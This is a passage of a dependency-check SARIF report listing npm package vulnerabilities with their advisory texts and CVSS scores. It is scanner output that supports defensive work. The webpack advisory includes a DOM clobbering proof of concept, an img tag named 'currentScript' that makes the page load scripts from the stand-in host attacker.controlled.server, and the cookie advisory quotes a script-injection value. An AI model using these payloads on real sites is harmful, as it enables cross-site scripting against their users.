(!scriptUrl) {\n\/******\/ \t\t\t\tvar scripts = document.getElementsByTagName(\"script\");\n\/******\/ \t\t\t\tif(scripts.length) {\n\/******\/ \t\t\t\t\tvar i = scripts.length - 1;\n\/******\/ \t\t\t\t\twhile (i > -1 && (!scriptUrl || !\/^http(s?):\/.test(scriptUrl))) scriptUrl = scripts[i--].src;\n\/******\/ \t\t\t\t}\n\/******\/ \t\t\t}\n\/******\/ \t\t}\n\/******\/ \t\t\/\/ When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration\n\/******\/ \t\t\/\/ or pass an empty string (\"\") and set the __webpack_public_path__ variable from your code to use your own logic.\n\/******\/ \t\tif (!scriptUrl) throw new Error(\"Automatic publicPath is not supported in this browser\");\n\/******\/ \t\tscriptUrl = scriptUrl.replace(\/#.*$\/, \"\").replace(\/\\?.*$\/, \"\").replace(\/\\\/[^\\\/]+$\/, \"\/\");\n\/******\/ \t\t__webpack_require__.p = scriptUrl;\n\/******\/ \t})();\n```\n\nHowever, this code is vulnerable to a DOM Clobbering attack. The lookup on the line with `document.currentScript` can be shadowed by an attacker, causing it to return an attacker-controlled HTML element instead of the current script element as intended. In such a scenario, the `src` attribute of the attacker-controlled element will be used as the `scriptUrl` and assigned to `__webpack_require__.p`. If additional scripts are loaded from the server, `__webpack_require__.p` will be used as the base URL, pointing to the attacker's domain. This could lead to arbitrary script loading from the attacker's server, resulting in severe security risks.\n\n### PoC\n\nPlease note that we have identified a real-world exploitation of this vulnerability in the Canvas LMS. Once the issue has been patched, I am willing to share more details on the exploitation. For now, I\u2019m providing a demo to illustrate the concept.\n\nConsider a website developer with the following two scripts, `entry.js` and `import1.js`, that are compiled using Webpack:\n\n```\n\/\/ entry.js\nimport('.\/import1.js')\n  .then(module => {\n    module.hello();\n  })\n  .catch(err => {\n    console.error('Failed to load module', err);\n  });\n```\n\n```\n\/\/ import1.js\nexport function hello () {\n  console.log('Hello');\n}\n```\n\nThe webpack.config.js is set up as follows:\n```\nconst path = require('path');\n\nmodule.exports = {\n  entry: '.\/entry.js', \/\/ Ensure the correct path to your entry file\n  output: {\n    filename: 'webpack-gadgets.bundle.js', \/\/ Output bundle file\n    path: path.resolve(__dirname, 'dist'), \/\/ Output directory\n    publicPath: \"auto\", \/\/ Or leave this field not set\n  },\n  target: 'web',\n  mode: 'development',\n};\n```\n\nWhen the developer builds these scripts into a bundle and adds it to a webpage, the page could load the `import1.js` file from the attacker's domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n  <title>Webpack Example<\/title>\n  <!-- Attacker-controlled Script-less HTML Element starts--!>\n  <img name=\"currentScript\" src=\"https:\/\/attacker.controlled.server\/\"><\/img>\n  <!-- Attacker-controlled Script-less HTML Element ends--!>\n<\/head>\n<script src=\".\/dist\/webpack-gadgets.bundle.js\"><\/script>\n<body>\n<\/body>\n<\/html>\n```\n\n### Impact\n\nThis vulnerability can lead to cross-site scripting (XSS) on websites that include Webpack-generated files and allow users to inject certain scriptless HTML tags with improperly sanitized name or id attributes.\n\n### Patch\n\nA possible patch to this vulnerability could refer to the Google Closure project which makes itself resistant to DOM Clobbering attack: https:\/\/github.com\/google\/closure-library\/blob\/b312823ec5f84239ff1db7526f4a75cba0420a33\/closure\/goog\/base.js#L174\n\n```\n\/******\/ \t\/* webpack\/runtime\/publicPath *\/\n\/******\/ \t(() => {\n\/******\/ \t\tvar scriptUrl;\n\/******\/ \t\tif (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + \"\";\n\/******\/ \t\tvar document = __webpack_require__.g.document;\n\/******\/ \t\tif (!scriptUrl && document) {\n\/******\/ \t\t\tif (document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT') \/\/ Assume attacker cannot control script tag, otherwise it is XSS already :>\n\/******\/ \t\t\t\tscriptUrl = document.currentScript.src;\n\/******\/ \t\t\tif (!scriptUrl) {\n\/******\/ \t\t\t\tvar scripts = document.getElementsByTagName(\"script\");\n\/******\/ \t\t\t\tif(scripts.length) {\n\/******\/ \t\t\t\t\tvar i = scripts.length - 1;\n\/******\/ \t\t\t\t\twhile (i > -1 && (!scriptUrl || !\/^http(s?):\/.test(scriptUrl))) scriptUrl = scripts[i--].src;\n\/******\/ \t\t\t\t}\n\/******\/ \t\t\t}\n\/******\/ \t\t}\n\/******\/ \t\t\/\/ When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration\n\/******\/ \t\t\/\/ or pass an empty string (\"\") and set the __webpack_public_path__ variable from your code to use your own logic.\n\/******\/ \t\tif (!scriptUrl) throw new Error(\"Automatic publicPath is not supported in this browser\");\n\/******\/ \t\tscriptUrl = scriptUrl.replace(\/#.*$\/, \"\").replace(\/\\?.*$\/, \"\").replace(\/\\\/[^\\\/]+$\/, \"\/\");\n\/******\/ \t\t__webpack_require__.p = scriptUrl;\n\/******\/ \t})();\n```\n\nPlease note that if we do not receive a response from the development team within three months, we will disclose this vulnerability to the CVE agent."},"help": {"text": "","markdown": "For more information see [GHSA-4vvj-4cpr-p986](https://github.com/advisories/GHSA-4vvj-4cpr-p986)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 6.400000095367432,"security-severity": "6.400000095367432","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "HIGH","cvssv3_privilegesRequired": "LOW","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "LOW","cvssv3_integrityImpact": "LOW","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "NPM"}},{"id": "CVE-2024-39249","shortDescription": {"text": "medium severity - CVE-2024-39249 Inefficient Regular Expression Complexity vulnerability in pkg:npm\/async@2.6.3"},"fullDescription": {"text": "Async <= 2.6.4 and <= 3.2.5 are vulnerable to ReDoS (Regular Expression Denial of Service) while parsing function in autoinject function. NOTE: this is disputed by the supplier because there is no realistic threat model: regular expressions are not used with untrusted input.\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2024-39249 for details"},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv2_score": 6.300000190734863,"cvssv2_accessVector": "NETWORK","cvssv2_accessComplexity": "LOW","cvssv2_authenticationr": "$enc.json($rule.cvssv2Authentication)","cvssv2_confidentialityImpact": "$enc.json($rule.cvssv2ConfidentialityImpact)","cvssv2_integrityImpact": "$enc.json($rule.cvssv2IntegrityImpact)","cvssv2_availabilityImpact": "$enc.json($rule.cvssv2AvailabilityImpact)","cvssv2_severity": "MEDIUM","source": "OSSINDEX"}},{"id": "GHSA-c2qf-rxjj-qqgw","shortDescription": {"text": "high severity - GHSA-c2qf-rxjj-qqgw Inefficient Regular Expression Complexity vulnerability in pkg:npm\/semver@5.7.1"},"fullDescription": {"text": "Versions of the package semver before 7.5.2 on the 7.x branch, before 6.3.1 on the 6.x branch, and all other versions before 5.7.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range."},"help": {"text": "","markdown": "For more information see [GHSA-c2qf-rxjj-qqgw](https://github.com/advisories/GHSA-c2qf-rxjj-qqgw)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "NPM"}},{"id": "CVE-2024-29041","shortDescription": {"text": "medium severity - CVE-2024-29041 Improper Validation of Syntactic Correctness of Input vulnerability in pkg:npm\/express@4.17.3"},"fullDescription": {"text": "Express.js minimalist web framework for node. Versions of Express.js prior to 4.19.0 and all pre-release alpha and beta versions of 5.0 are affected by an open redirect vulnerability using malformed URLs. When a user of Express performs a redirect using a user-provided URL Express performs an encode [using `encodeurl`](https:\/\/github.com\/pillarjs\/encodeurl) on the contents before passing it to the `location` header. This can cause malformed URLs to be evaluated in unexpected ways by common redirect allow list implementations in Express applications, leading to an Open Redirect via bypass of a properly implemented allow list. The main method impacted is `res.location()` but this is also called from within `res.redirect()`. The vulnerability is fixed in 4.19.2 and 5.0.0-beta.3."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 6.099999904632568,"security-severity": "6.099999904632568","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "REQUIRED","cvssv3_scope": "CHANGED","cvssv3_confidentialityImpact": "LOW","cvssv3_integrityImpact": "LOW","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "CVE-2022-41940","shortDescription": {"text": "medium severity - CVE-2022-41940 Uncaught Exception vulnerability in pkg:npm\/engine.io@6.1.2"},"fullDescription": {"text": "Engine.IO is the implementation of transport-based cross-browser\/cross-device bi-directional communication layer for Socket.IO. A specially crafted HTTP request can trigger an uncaught exception on the Engine.IO server, thus killing the Node.js process. This impacts all the users of the engine.io package, including those who uses depending packages like socket.io. There is no known workaround except upgrading to a safe version. There are patches for this issue released in versions 3.6.1 and 6.2.1."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 6.5,"security-severity": "6.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "LOW","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "GHSA-cfm4-qjh2-4765","shortDescription": {"text": "high severity - GHSA-cfm4-qjh2-4765 Improper Verification of Cryptographic Signature vulnerability in pkg:npm\/node-forge@1.2.1"},"fullDescription": {"text": "### Impact\n\nRSA PKCS#1 v1.5 signature verification code is lenient in checking the digest algorithm structure. This can allow a crafted structure that steals padding bytes and uses unchecked portion of the PKCS#1 encoded message to forge a signature when a low public exponent is being used.\n\n### Patches\n\nThe issue has been addressed in `node-forge` `1.3.0`.\n\n### References\n\nFor more information, please see\n[\"Bleichenbacher's RSA signature forgery based on implementation error\"](https:\/\/mailarchive.ietf.org\/arch\/msg\/openpgp\/5rnE9ZRN1AokBVj3VqblGlP63QE\/)\nby Hal Finney.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [forge](https:\/\/github.com\/digitalbazaar\/forge)\n* Email us at [example email address](mailto:security@digitalbazaar.com)"},"help": {"text": "","markdown": "For more information see [GHSA-cfm4-qjh2-4765](https://github.com/advisories/GHSA-cfm4-qjh2-4765)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "HIGH","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "NPM"}},{"id": "CVE-2024-43788","shortDescription": {"text": "medium severity - CVE-2024-43788 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in pkg:npm\/webpack@5.67.0"},"fullDescription": {"text": "Webpack is a module bundler. Its main purpose is to bundle JavaScript files for usage in a browser, yet it is also capable of transforming, bundling, or packaging just about any resource or asset. The webpack developers have discovered a DOM Clobbering vulnerability in Webpack\u2019s `AutoPublicPathRuntimeModule`. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present. Real-world exploitation of this gadget has been observed in the Canvas LMS which allows a XSS attack to happen through a javascript code compiled by Webpack (the vulnerable part is from Webpack). DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. This vulnerability can lead to cross-site scripting (XSS) on websites that include Webpack-generated files and allow users to inject certain scriptless HTML tags with improperly sanitized name or id attributes. This issue has been addressed in release version 5.94.0. All users are advised to upgrade. There are no known workarounds for this issue."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 6.099999904632568,"security-severity": "6.099999904632568","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "REQUIRED","cvssv3_scope": "CHANGED","cvssv3_confidentialityImpact": "LOW","cvssv3_integrityImpact": "LOW","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "CVE-2024-45296","shortDescription": {"text": "high severity - CVE-2024-45296 Inefficient Regular Expression Complexity vulnerability in pkg:npm\/path-to-regexp@0.1.7"},"fullDescription": {"text": "path-to-regexp turns path strings into a regular expressions. In certain cases, path-to-regexp will output a regular expression that can be exploited to cause poor performance. Because JavaScript is single threaded and regex matching runs on the main thread, poor performance will block the event loop and lead to a DoS. The bad regular expression is generated any time you have two parameters within a single segment, separated by something that is not a period (.). For users of 0.1, upgrade to 0.1.10. All other users should upgrade to 8.0.0."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv2_score": 8.699999809265137,"cvssv2_accessVector": "NETWORK","cvssv2_accessComplexity": "LOW","cvssv2_authenticationr": "$enc.json($rule.cvssv2Authentication)","cvssv2_confidentialityImpact": "$enc.json($rule.cvssv2ConfidentialityImpact)","cvssv2_integrityImpact": "$enc.json($rule.cvssv2IntegrityImpact)","cvssv2_availabilityImpact": "$enc.json($rule.cvssv2AvailabilityImpact)","cvssv2_severity": "HIGH","source": "OSSINDEX"}},{"id": "GHSA-grv7-fg5c-xmjg","shortDescription": {"text": "high severity - GHSA-grv7-fg5c-xmjg Uncontrolled Resource Consumption vulnerability in pkg:npm\/braces@3.0.2"},"fullDescription": {"text": "The NPM package `braces` fails to limit the number of characters it can handle, which could lead to Memory Exhaustion. In `lib\/parse.js,` if a malicious user sends \"imbalanced braces\" as input, the parsing will enter a loop, which will cause the program to start allocating heap memory without freeing it at any moment of the loop. Eventually, the JavaScript heap limit is reached, and the program will crash.\n"},"help": {"text": "","markdown": "For more information see [GHSA-grv7-fg5c-xmjg](https://github.com/advisories/GHSA-grv7-fg5c-xmjg)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "NPM"}},{"id": "CVE-2023-44270","shortDescription": {"text": "medium severity - CVE-2023-44270 Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection') vulnerability in pkg:npm\/postcss@8.4.5"},"fullDescription": {"text": "An issue was discovered in PostCSS before 8.4.31. The vulnerability affects linters using PostCSS to parse external untrusted CSS. An attacker can prepare CSS in such a way that it will contains parts parsed by PostCSS as a CSS comment. After processing by PostCSS, it will be included in the PostCSS output in CSS nodes (rules, properties) despite being included in a comment."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 5.300000190734863,"security-severity": "5.300000190734863","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "LOW","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "GHSA-pxg6-pf52-xh8x","shortDescription": {"text": "low severity - GHSA-pxg6-pf52-xh8x Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection') vulnerability in pkg:npm\/cookie@0.4.2"},"fullDescription": {"text": "### Impact\n\nThe cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. For example, `serialize(\"userName=<script>alert('XSS3')<\/script>; Max-Age=2592000; a\", value)` would result in `\"userName=<script>alert('XSS3')<\/script>; Max-Age=2592000; a=test\"`, setting `userName` cookie to `<script>` and ignoring `value`.\n\nA similar escape can be used for `path` and `domain`, which could be abused to alter other fields of the cookie.\n\n### Patches\n\nUpgrade to 0.7.0, which updates the validation for `name`, `path`, and `domain`.\n\n### Workarounds\n\nAvoid passing untrusted or arbitrary values for these fields, ensure they are set by the application instead of user input.\n\n### References\n\n* https:\/\/github.com\/jshttp\/cookie\/pull\/167"},"help": {"text": "","markdown": "For more information see [GHSA-pxg6-pf52-xh8x](https://github.com/advisories/GHSA-pxg6-pf52-xh8x)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"source": "NPM"}},{"id": "GHSA-4www-5p9h-95mh","shortDescription": {"text": "medium severity - GHSA-4www-5p9h-95mh Always-Incorrect Control Flow Implementation vulnerability in pkg:npm\/http-proxy-middleware@2.0.3"},"fullDescription": {"text": "In http-proxy-middleware before 2.0.8 and 3.x before 3.0.4, writeBody can be called twice because \"else if\" is not used."},"help": {"text": "","markdown": "For more information see [GHSA-4www-5p9h-95mh](https://github.com/advisories/GHSA-4www-5p9h-95mh)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 4.0,"security-severity": "4.0","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "HIGH","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "CHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "LOW","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "NPM"}},{"id": "GHSA-2p57-rm9w-gvfp","shortDescription": {"text": "high severity - GHSA-2p57-rm9w-gvfp Server-Side Request Forgery (SSRF) vulnerability in pkg:npm\/ip@1.1.5"},"fullDescription": {"text": "The ip package through 2.0.1 for Node.js might allow SSRF because some IP addresses (such as 127.1, 01200034567, 012.1.2.3, 000:0:0000::01, and ::fFFf:127.0.0.1) are improperly categorized as globally routable via isPublic. NOTE: this issue exists because of an incomplete fix for CVE-2023-42282."},"help": {"text": "","markdown": "For more information see [GHSA-2p57-rm9w-gvfp](https://github.com/advisories/GHSA-2p57-rm9w-gvfp)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 8.100000381469727,"security-severity": "8.100000381469727","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "HIGH","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "HIGH","cvssv3_integrityImpact": "HIGH","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "NPM"}},{"id": "GHSA-rv95-896h-c2vc","shortDescription": {"text": "medium severity - GHSA-rv95-896h-c2vc URL Redirection to Untrusted Site ('Open Redirect') vulnerability in pkg:npm\/express@4.17.3"},"fullDescription": {"text": "### Impact\n\nVersions of Express.js prior to 4.19.2 and pre-release alpha and beta versions before 5.0.0-beta.3 are affected by an open redirect vulnerability using malformed URLs.\n\nWhen a user of Express performs a redirect using a user-provided URL Express performs an encode [using `encodeurl`](https:\/\/github.com\/pillarjs\/encodeurl) on the contents before passing it to the `location` header. This can cause malformed URLs to be evaluated in unexpected ways by common redirect allow list implementations in Express applications, leading to an Open Redirect via bypass of a properly implemented allow list.\n\nThe main method impacted is `res.location()` but this is also called from within `res.redirect()`.\n\n### Patches\n\nhttps:\/\/github.com\/expressjs\/express\/commit\/0867302ddbde0e9463d0564fea5861feb708c2dd\nhttps:\/\/github.com\/expressjs\/express\/commit\/0b746953c4bd8e377123527db11f9cd866e39f94\n\nAn initial fix went out with `express@4.19.0`, we then patched a feature regression in `4.19.1` and added improved handling for the bypass in `4.19.2`.\n\n### Workarounds\n\nThe fix for this involves pre-parsing the url string with either `require('node:url').parse` or `new URL`. These are steps you can take on your own before passing the user input string to `res.location` or `res.redirect`.\n\n### References\n\nhttps:\/\/github.com\/expressjs\/express\/pull\/5539\nhttps:\/\/github.com\/koajs\/koa\/issues\/1800\nhttps:\/\/expressjs.com\/en\/4x\/api.html#res.location"},"help": {"text": "","markdown": "For more information see [GHSA-rv95-896h-c2vc](https://github.com/advisories/GHSA-rv95-896h-c2vc)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 6.099999904632568,"security-severity": "6.099999904632568","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "REQUIRED","cvssv3_scope": "CHANGED","cvssv3_confidentialityImpact": "LOW","cvssv3_integrityImpact": "LOW","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "NPM"}},{"id": "CVE-2022-25927","shortDescription": {"text": "high severity - CVE-2022-25927 Inefficient Regular Expression Complexity vulnerability in pkg:npm\/ua-parser-js@0.7.31"},"fullDescription": {"text": "ua-parser-js - Regular Expression Denial of Service (ReDoS) [ CVE-2022-25927 ]\n\nua-parser-js - Regular Expression Denial of Service (ReDoS) [ CVE-2022-25927 ]"},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "GHSA-9gqv-wp59-fq42","shortDescription": {"text": "medium severity - GHSA-9gqv-wp59-fq42 Improper Check for Unusual or Exceptional Conditions vulnerability in pkg:npm\/http-proxy-middleware@2.0.3"},"fullDescription": {"text": "In http-proxy-middleware before 2.0.9 and 3.x before 3.0.5, fixRequestBody proceeds even if bodyParser has failed."},"help": {"text": "","markdown": "For more information see [GHSA-9gqv-wp59-fq42](https://github.com/advisories/GHSA-9gqv-wp59-fq42)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 4.0,"security-severity": "4.0","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "HIGH","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "CHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "LOW","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "NPM"}},{"id": "GHSA-fwr7-v2mv-hh25","shortDescription": {"text": "high severity - GHSA-fwr7-v2mv-hh25 Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') vulnerability in pkg:npm\/async@2.6.3"},"fullDescription": {"text": "A vulnerability exists in Async through 3.2.1 for 3.x and through 2.6.3 for 2.x (fixed in 3.2.2 and 2.6.4), which could let a malicious user obtain privileges via the `mapValues()` method."},"help": {"text": "","markdown": "For more information see [GHSA-fwr7-v2mv-hh25](https://github.com/advisories/GHSA-fwr7-v2mv-hh25)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.800000190734863,"security-severity": "7.800000190734863","cvssv3_attackVector": "LOCAL","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "REQUIRED","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "HIGH","cvssv3_integrityImpact": "HIGH","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "NPM"}},{"id": "CVE-2024-28863","shortDescription": {"text": "medium severity - CVE-2024-28863 Uncontrolled Resource Consumption vulnerability in pkg:npm\/tar@6.1.11"},"fullDescription": {"text": "node-tar is a Tar for Node.js. node-tar prior to version 6.2.1 has no limit on the number of sub-folders created in the folder creation process. An attacker who generates a large number of sub-folders can consume memory on the system running node-tar and even crash the Node.js client within few seconds of running it using a path with too many sub-folders inside. Version 6.2.1 fixes this issue by preventing extraction in excessively deep sub-folders."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a 